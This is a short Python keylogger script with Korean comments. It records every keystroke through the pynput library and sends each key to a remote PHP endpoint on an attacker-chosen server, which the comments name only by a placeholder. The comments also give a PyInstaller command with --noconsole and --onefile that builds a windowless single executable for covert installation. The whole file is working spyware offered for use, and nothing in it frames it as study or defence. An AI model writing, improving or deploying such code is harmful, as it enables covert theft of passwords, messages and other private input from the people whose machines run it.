#pip install pynput 해야함
#exe파일 만들때는 다음 명령어로 입력해야함(pip install pyinstaller) ->    pyinstaller --noconsole --onefile --hidden-import "pynput.keyboard._win32" --hidden-import "pynput.mouse._win32" hardkey.py
import pynput
from pynput.keyboard import Key, Listener
import logging
import requests

#로깅파일설치된 컴퓨터 내부에 로그파일저장
#log_dir = r"./"
#logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#서버에 저장
def on_press(key):
    logging.info(str(key))
    per=str(key)
    payload = {'k':per}
    r = requests.get('서버/php파일 여기서는 임의의 이름으로 lolo.php 라 하겠음', params=payload)
with Listener(on_press=on_press) as listener:
    listener.join()
